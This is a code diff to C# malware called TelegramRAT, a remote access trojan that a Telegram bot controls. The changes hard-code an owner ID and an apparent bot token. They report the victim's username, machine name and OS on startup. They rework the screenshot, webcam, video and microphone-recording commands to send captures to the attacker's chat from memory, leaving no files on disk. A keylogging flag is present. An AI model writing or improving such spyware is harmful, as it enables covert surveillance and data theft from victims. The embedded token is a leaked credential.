@@ -31,8 +31,8 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
-        readonly static string BotToken = null; // Place your Telegram bot token. 
+        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null.
+        readonly static string BotToken = "1727211141:AAHYjMAS6Zo7q7_kgRLUkkOj7lVjWonhikQ"; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
@@ -72,9 +72,8 @@ namespace TelegramRAT
             {
                 Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
                 Bot.SendTextMessageAsync(OwnerId, "Attempting to restart. Please wait...");
-                Main(null);
+                Main(args);
             }
-
         }
 
         static async void ReportError(Update update, Exception exception)
@@ -86,21 +85,17 @@ namespace TelegramRAT
 #endif
         }
 
-
-
         static async Task Run()
         {
-            if (OwnerId != null)
-            {
-                await Bot.SendTextMessageAsync(OwnerId,
-                    $"Computer online! \n\n" +
+            await Bot.SendTextMessageAsync(OwnerId,
+                $"Computer online! \n\n" +
 
-                    $"Username: <b>{Environment.UserName}</b>\n" +
-                    $"PC name: <b>{Environment.MachineName}</b>\n\n" +
+                $"Username: <b>{Environment.UserName}</b>\n" +
+                $"PC name: <b>{Environment.MachineName}</b>\n\n" +
 
-                    $"OS: {GetWindowsVersion()}",
-                    ParseMode.Html);
-            }
+                $"OS: {GetWindowsVersion()}",
+                ParseMode.Html);
+
             var offset = 0;
 
             while (true)
@@ -115,7 +110,6 @@ namespace TelegramRAT
             }
 
         }
-
 
         public static async Task UpdateWorker(Update[] Updates)
         {
@@ -150,7 +144,7 @@ namespace TelegramRAT
                             await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
                                  $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
                         }
-                        continue;
+                        break;
                     }
                 }
             }
@@ -556,24 +550,18 @@ namespace TelegramRAT
                             Rectangle bounds = WinAPI.GetScreenBounds();
 
                             using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                            using (Graphics g = Graphics.FromImage(bitmap))
+                            using (MemoryStream screenshotStream = new MemoryStream())
                             {
-                                using (Graphics g = Graphics.FromImage(bitmap))
-                                {
+                                g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
 
-                                    g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
+                                bitmap.Save(screenshotStream, ImageFormat.Png);
 
-                                    bitmap.Save("scr.png", ImageFormat.Png);
+                                screenshotStream.Position = 0;
 
+                                await Bot.SendPhotoAsync(chatId: update.Message.Chat.Id, photo: screenshotStream, caption: "Screenshot!", replyToMessageId: update.Message.MessageId);
 
-                                    using (var ScreenshotStream = new FileStream("scr.png", FileMode.Open, FileAccess.Read, FileShare.Read))
-                                    {
-                                        await Bot.SendPhotoAsync(chatId: update.Message.Chat.Id, photo: ScreenshotStream, caption: "Screenshot!", replyToMessageId: update.Message.MessageId);
-                                    }
-                                }
                             }
-
-                            System.IO.File.Delete("scr.png");
-
                         }
                         catch (Exception ex)
                         {
@@ -614,23 +602,19 @@ namespace TelegramRAT
                     {
                         try
                         {
-
                             Mat img = new Mat();
 
                             using (var FrameSrc = Cv2.CreateFrameSource_Camera(0))
                             {
                                 FrameSrc.NextFrame(img);
                             }
-                            img.SaveImage("webcam.jpg");
+                            MemoryStream webcamShot = img.ToMemoryStream();
 
+                            webcamShot.Position = 0;
 
-                            using (var fs = new FileStream("webcam.jpg", FileMode.Open))
-                            {
-                                InputOnlineFile webcamPhoto = new InputOnlineFile(fs);
-                                await Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
-                            }
-                            System.IO.File.Delete("webcam.jpg");
-
+                            InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShot);
+                            await Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
+                            
                         }
                         catch (Exception ex)
                         {
@@ -765,7 +749,7 @@ namespace TelegramRAT
                                 FrameWidth = 1280,
                                 FrameHeight = 720,
                             };
-
+                            
                             Mat frame = new Mat();
                             VideoWriter vidWriter = new VideoWriter("vid.mp4", FourCC.H264, 30, new OpenCvSharp.Size(cap.FrameWidth, cap.FrameHeight));
 
@@ -779,7 +763,6 @@ namespace TelegramRAT
                             await Bot.SendChatActionAsync(update.Message.Chat.Id, ChatAction.UploadVideo);
 
                             cap.Release();
-
 
                             vidWriter.Release();
 
@@ -1308,7 +1291,7 @@ namespace TelegramRAT
             {
                 Command = "/audio",
                 CountArgs = 1,
-                Description = "Record audio from microphone for given amount of secs or start and stop as a first argument.",
+                Description = "Record audio from microphone for given amount of secs.",
                 Example = "/audio 50",
                 Execute = (model, update) =>
                 {
@@ -1316,70 +1299,21 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            if (model.Args[0].ToLower() == "start")
+                            uint recordLength;
+
+                            if (uint.TryParse(model.Args[0], out recordLength) is false)
                             {
-                                if (!doRecord)
-                                {
-                                    doRecord = true;
-                                    waveIn = new WaveInEvent()
-                                    {
-                                        WaveFormat = new WaveFormat(44100, 1)
-                                    };
-
-                                    waveFileWriter = new WaveFileWriter("record.wav", waveIn.WaveFormat);
-
-                                    waveIn.DataAvailable += new EventHandler<WaveInEventArgs>((object sender, WaveInEventArgs args) =>
-                                    {
-                                        if (waveFileWriter != null)
-                                        {
-                                            waveFileWriter.Write(args.Buffer, 0, args.BytesRecorded);
-                                            waveFileWriter.Flush();
-                                        }
-                                    });
-
-                                    waveIn.StartRecording();
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording!", replyToMessageId: update.Message.MessageId);
-                                }
-                                else
-                                {
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording!", replyToMessageId: update.Message.MessageId);
-                                }
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Argument must be a positive integer!", replyToMessageId: update.Message.MessageId);
                                 return;
                             }
-                            if (model.Args[0].ToLower() == "stop")
-                            {
-                                if (doRecord)
-                                {
-                                    doRecord = false;
-                                    waveIn.StopRecording();
-                                    Task.Delay(200).Wait();
-
-                                    waveFileWriter.Close();
-                                    Task.Delay(200).Wait();
-
-                                    using (FileStream fs = new FileStream("record.wav", FileMode.Open))
-                                    {
-                                        InputOnlineFile file = new InputOnlineFile(fs);
-                                        Bot.SendAudioAsync(update.Message.Chat.Id, file, replyToMessageId: update.Message.MessageId).Wait();
-
-                                    }
-                                    System.IO.File.Delete("record.wav");
-                                }
-                                else
-                                {
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Recording isn't started yet!", replyToMessageId: update.Message.MessageId);
-                                }
-                                return;
-                            }
-
-                            int time = int.Parse(model.Args[0]);
 
                             WaveInEvent waveIn2 = new WaveInEvent();
 
                             waveIn2.WaveFormat = new WaveFormat(44100, 1);
-                            WaveFileWriter waveFileWriter2 = new WaveFileWriter("record.wav", waveIn2.WaveFormat);
+                            MemoryStream memstrm = new MemoryStream();
+                            WaveFileWriter waveFileWriter2 = new WaveFileWriter(memstrm, waveIn2.WaveFormat);
 
-                            waveIn2.DataAvailable += new EventHandler<WaveInEventArgs>((object sender, WaveInEventArgs args) =>
+                            waveIn2.DataAvailable += new EventHandler<WaveInEventArgs>((sender, args) =>
                             {
                                 if (waveFileWriter2 != null)
                                 {
@@ -1387,34 +1321,20 @@ namespace TelegramRAT
                                     waveFileWriter2.Flush();
                                 }
                             });
-                            waveIn2.RecordingStopped += new EventHandler<StoppedEventArgs>((object sender, StoppedEventArgs args) =>
-                            {
-                                if (waveFileWriter2 != null)
-                                {
-                                    waveFileWriter2.Dispose();
-                                    waveFileWriter2.Close();
-                                }
-                                if (waveIn2 != null)
-                                {
-                                    waveIn2.Dispose();
-                                }
-                            });
 
                             waveIn2.StartRecording();
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording", replyToMessageId: update.Message.MessageId);
 
-                            Task.Delay(time * 1000).Wait();
+                            Task.Delay((int)recordLength * 1000).Wait();
+
                             waveIn2.StopRecording();
-                            Task.Delay(200).Wait();
-                            waveFileWriter2.Close();
-                            Task.Delay(200).Wait();
 
-                            using (FileStream fs = new FileStream("record.wav", FileMode.Open))
-                            {
-                                Bot.SendAudioAsync(update.Message.Chat.Id, new InputOnlineFile(fs), replyToMessageId: update.Message.MessageId).Wait();
-                            }
-                            System.IO.File.Delete("record.wav");
+                            memstrm.Position = 0;
 
+                            Bot.SendAudioAsync(update.Message.Chat.Id, new InputOnlineFile(memstrm, fileName: "aboba"), replyToMessageId: update.Message.MessageId).Wait();
+
+                            waveIn2.Dispose();
+                            memstrm.Close();
 
                         }
                         catch (Exception ex)
